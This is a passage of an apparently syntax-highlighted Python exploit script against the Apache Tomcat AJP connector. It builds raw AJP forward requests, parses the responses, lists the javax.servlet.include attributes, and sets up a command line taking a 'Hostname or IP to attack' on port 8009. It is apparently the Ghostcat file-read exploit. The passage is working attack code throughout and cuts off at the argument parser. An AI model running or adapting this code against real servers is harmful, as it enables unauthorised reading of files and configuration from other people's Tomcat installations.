		<span class="n">res</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">bb</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">method</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">protocol</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">req_uri</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">remote_host</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="nf">pack_string</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">server_name</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;h</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">server_port</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">?</span><span class="sh">"</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">is_ssl</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">self</span><span class="p">.</span><span class="nf">pack_headers</span><span class="p">()</span>
		<span class="n">res</span> <span class="o">+=</span> <span class="n">self</span><span class="p">.</span><span class="nf">pack_attributes</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">data_direction</span> <span class="o">==</span> <span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">:</span>
			<span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;bbh</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">header</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;bbh</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">res</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">header</span> <span class="o">+</span> <span class="n">res</span>
	<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">raw_packet</span><span class="p">):</span>
		<span class="n">stream</span> <span class="o">=</span> <span class="nc">StringIO</span><span class="p">(</span><span class="n">raw_packet</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">magic1</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">magic2</span><span class="p">,</span> <span class="n">data_len</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">bbH</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">bb</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;h</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">?</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">num_headers</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="p">{}</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">num_headers</span><span class="p">):</span>
			<span class="n">code</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">code</span> <span class="o">&gt;</span> <span class="mh">0xA000</span><span class="p">:</span>
				<span class="n">h_name</span> <span class="o">=</span> <span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">COMMON_HEADERS</span><span class="p">[</span><span class="n">code</span> <span class="o">-</span> <span class="mh">0xA001</span><span class="p">]</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">h_name</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">%ds</span><span class="sh">"</span> <span class="o">%</span> <span class="n">code</span><span class="p">)</span>
				<span class="n">stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># \0
</span>			<span class="n">h_value</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
			<span class="n">self</span><span class="p">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">h_value</span>
	<span class="k">def</span> <span class="nf">send_and_receive</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">stream</span><span class="p">,</span> <span class="n">save_cookies</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
		<span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
		<span class="n">i</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="nf">serialize</span><span class="p">())</span>
		<span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">POST</span><span class="p">:</span>
			<span class="k">return</span> <span class="n">res</span>

		<span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">assert</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_HEADERS</span>
		<span class="n">res</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">save_cookies</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">Set-Cookie</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">response_headers</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">SC_REQ_COOKIE</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">response_headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Set-Cookie</span><span class="sh">'</span><span class="p">]</span>

		<span class="c1"># read body chunks and end response packets
</span>		<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
			<span class="n">r</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">END_RESPONSE</span><span class="p">:</span>
				<span class="k">break</span>
			<span class="k">elif</span> <span class="n">r</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_BODY_CHUNK</span><span class="p">:</span>
				<span class="k">continue</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="k">raise</span> <span class="nb">NotImplementedError</span>
				<span class="k">break</span>

		<span class="k">return</span> <span class="n">res</span>

<span class="k">class</span> <span class="nc">AjpResponse</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">_</span><span class="p">,</span><span class="n">SEND_BODY_CHUNK</span><span class="p">,</span> <span class="n">SEND_HEADERS</span><span class="p">,</span> <span class="n">END_RESPONSE</span><span class="p">,</span> <span class="n">GET_BODY_CHUNK</span> <span class="o">=</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
	<span class="n">COMMON_SEND_HEADERS</span> <span class="o">=</span> <span class="p">[</span>
			<span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Content-Language</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Content-Length</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Date</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Last-Modified</span><span class="sh">"</span><span class="p">,</span>
			<span class="sh">"</span><span class="s">Location</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Set-Cookie</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Set-Cookie2</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Servlet-Engine</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Status</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">WWW-Authenticate</span><span class="sh">"</span>
			<span class="p">]</span>
	<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="c1"># read headers
</span>		<span class="n">self</span><span class="p">.</span><span class="n">magic</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">data_length</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;HHb</span><span class="sh">"</span><span class="p">)</span>

		<span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_HEADERS</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="nf">parse_send_headers</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">SEND_BODY_CHUNK</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="nf">parse_send_body_chunk</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">END_RESPONSE</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="nf">parse_end_response</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">self</span><span class="p">.</span><span class="n">prefix_code</span> <span class="o">==</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">GET_BODY_CHUNK</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="nf">parse_get_body_chunk</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">raise</span> <span class="nb">NotImplementedError</span>

	<span class="k">def</span> <span class="nf">parse_send_headers</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">http_status_code</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">http_status_msg</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">num_headers</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">response_headers</span> <span class="o">=</span> <span class="p">{}</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">num_headers</span><span class="p">):</span>
			<span class="n">code</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
			<span class="k">if</span> <span class="n">code</span> <span class="o">&lt;=</span> <span class="mh">0xA000</span><span class="p">:</span> <span class="c1"># custom header
</span>				<span class="n">h_name</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">%ds</span><span class="sh">"</span> <span class="o">%</span> <span class="n">code</span><span class="p">)</span>
				<span class="n">stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># \0
</span>				<span class="n">h_value</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="n">h_name</span> <span class="o">=</span> <span class="n">AjpResponse</span><span class="p">.</span><span class="n">COMMON_SEND_HEADERS</span><span class="p">[</span><span class="n">code</span><span class="o">-</span><span class="mh">0xA001</span><span class="p">]</span>
				<span class="n">h_value</span> <span class="o">=</span> <span class="nf">unpack_string</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
			<span class="n">self</span><span class="p">.</span><span class="n">response_headers</span><span class="p">[</span><span class="n">h_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">h_value</span>

	<span class="k">def</span> <span class="nf">parse_send_body_chunk</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data_length</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">data_length</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">parse_end_response</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">reuse</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">b</span><span class="sh">"</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">parse_get_body_chunk</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">stream</span><span class="p">):</span>
		<span class="n">rlen</span><span class="p">,</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">rlen</span>

	<span class="nd">@staticmethod</span>
	<span class="k">def</span> <span class="nf">receive</span><span class="p">(</span><span class="n">stream</span><span class="p">):</span>
		<span class="n">r</span> <span class="o">=</span> <span class="nc">AjpResponse</span><span class="p">()</span>
		<span class="n">r</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">r</span>

<span class="kn">import</span> <span class="n">socket</span>

<span class="k">def</span> <span class="nf">prepare_ajp_forward_request</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">GET</span><span class="p">):</span>
	<span class="n">fr</span> <span class="o">=</span> <span class="nc">AjpForwardRequest</span><span class="p">(</span><span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">SERVER_TO_CONTAINER</span><span class="p">)</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">method</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="sh">"</span><span class="s">HTTP/1.1</span><span class="sh">"</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">req_uri</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="n">target_host</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">remote_host</span> <span class="o">=</span> <span class="bp">None</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">server_name</span> <span class="o">=</span> <span class="n">target_host</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">server_port</span> <span class="o">=</span> <span class="mi">80</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">request_headers</span> <span class="o">=</span> <span class="p">{</span>
		<span class="sh">'</span><span class="s">SC_REQ_ACCEPT</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">text/html</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">SC_REQ_CONNECTION</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">keep-alive</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">SC_REQ_CONTENT_LENGTH</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">SC_REQ_HOST</span><span class="sh">'</span><span class="p">:</span> <span class="n">target_host</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">SC_REQ_USER_AGENT</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Mozilla</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">Accept-Encoding</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">gzip, deflate, sdch</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">Accept-Language</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">en-US,en;q=0.5</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">,</span>
		<span class="sh">'</span><span class="s">Cache-Control</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">max-age=0</span><span class="sh">'</span>
	<span class="p">}</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">is_ssl</span> <span class="o">=</span> <span class="bp">False</span>
	<span class="n">fr</span><span class="p">.</span><span class="n">attributes</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">return</span> <span class="n">fr</span>

<span class="k">class</span> <span class="nc">Tomcat</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="n">target_host</span>
		<span class="n">self</span><span class="p">.</span><span class="n">target_port</span> <span class="o">=</span> <span class="n">target_port</span>

		<span class="n">self</span><span class="p">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">socket</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
		<span class="n">self</span><span class="p">.</span><span class="n">socket</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
		<span class="n">self</span><span class="p">.</span><span class="n">stream</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">socket</span><span class="p">.</span><span class="nf">makefile</span><span class="p">(</span><span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>

	<span class="k">def</span> <span class="nf">perform_request</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{},</span> <span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="p">[]):</span>
		<span class="n">self</span><span class="p">.</span><span class="n">req_uri</span> <span class="o">=</span> <span class="n">req_uri</span>
		<span class="n">self</span><span class="p">.</span><span class="n">forward_request</span> <span class="o">=</span> <span class="nf">prepare_ajp_forward_request</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">req_uri</span><span class="p">,</span> <span class="n">method</span><span class="o">=</span><span class="n">AjpForwardRequest</span><span class="p">.</span><span class="n">REQUEST_METHODS</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">method</span><span class="p">))</span>
		<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Getting resource at ajp13://%s:%d%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">target_host</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">target_port</span><span class="p">,</span> <span class="n">req_uri</span><span class="p">))</span>
		<span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">password</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="n">forward_request</span><span class="p">.</span><span class="n">request_headers</span><span class="p">[</span><span class="sh">'</span><span class="s">SC_REQ_AUTHORIZATION</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Basic </span><span class="sh">"</span> <span class="o">+</span> <span class="p">(</span><span class="sh">"</span><span class="s">%s:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">)).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">base64</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">headers</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="n">forward_request</span><span class="p">.</span><span class="n">request_headers</span><span class="p">[</span><span class="n">h</span><span class="p">]</span> <span class="o">=</span> <span class="n">headers</span><span class="p">[</span><span class="n">h</span><span class="p">]</span>
		<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
			<span class="n">self</span><span class="p">.</span><span class="n">forward_request</span><span class="p">.</span><span class="n">attributes</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
		<span class="n">responses</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">forward_request</span><span class="p">.</span><span class="nf">send_and_receive</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">stream</span><span class="p">)</span>
		<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">responses</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
		<span class="n">snd_hdrs_res</span> <span class="o">=</span> <span class="n">responses</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
		<span class="n">data_res</span> <span class="o">=</span> <span class="n">responses</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
		<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">data_res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
			<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">No data in response. Headers:%s</span><span class="se">\n</span><span class="sh">"</span> <span class="o">%</span> <span class="n">snd_hdrs_res</span><span class="p">.</span><span class="n">response_headers</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">snd_hdrs_res</span><span class="p">,</span> <span class="n">data_res</span>

<span class="sh">'''</span><span class="s">
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
</span><span class="sh">'''</span>

<span class="kn">import</span> <span class="n">argparse</span>
<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">target</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Hostname or IP to attack</span><span class="sh">"</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">8009</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">AJP port to attack (default is 8009)</span><span class="sh">"</span><span class="p">)</span>
